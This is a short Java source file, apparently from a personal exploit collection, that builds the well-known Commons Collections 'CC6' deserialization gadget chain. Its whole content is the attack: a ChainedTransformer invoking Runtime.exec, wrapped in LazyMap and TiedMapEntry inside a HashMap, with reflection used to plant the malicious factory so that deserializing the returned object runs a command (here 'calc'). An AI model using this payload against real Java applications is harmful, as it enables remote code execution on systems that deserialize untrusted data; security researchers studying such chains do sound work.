package com.yyjccc.CommonsExp;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Cc6 {
    public static Object cc6() throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap=new HashMap<>();
        Map<Object,Object> decoratemap= LazyMap.decorate(hashMap,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry=new TiedMapEntry(decoratemap,"aaa");
        HashMap<Object,Object> map2=new HashMap<>();
        map2.put(tiedMapEntry,"sss");
        decoratemap.remove("aaa");
        Class c=decoratemap.getClass();
        Field factory=c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(decoratemap,chainedTransformer);
     return map2;
    }
}
